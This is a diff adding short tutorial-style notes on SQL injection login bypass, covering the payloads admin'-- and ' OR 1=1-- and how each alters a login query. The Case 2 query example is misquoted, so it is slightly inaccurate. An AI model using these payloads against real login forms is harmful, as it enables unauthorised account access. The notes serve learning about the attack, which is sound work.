@@ -1,0 +1,22 @@
+# This is the methodology for SQL Authentication bypass
+
+Generally a SQL Query for login looks like this -
+
+SELECT * FROM users WHERE username = 'tom' and password = 'pass'
+
+## CASE 1 - Attacker knows there is a user called 'admin'
+
+An attacker can enter the following - admin'--
+
+What this does is
+SELECT * FROM users WHERE username = 'admin'-- and password = 'pass'
+the '--' comments out everything after it so it just matches the admin username and logs us in
+
+## CASE 2 - Attacker does not know the admin username
+
+The query would generally process the first user whose details are returned, this is exploited by
+' OR 1=1--
+
+SELECT * FROM users WHERE username = 'OR 1=1-- and password = 'pass'
+
+And this can return details of all users as well.
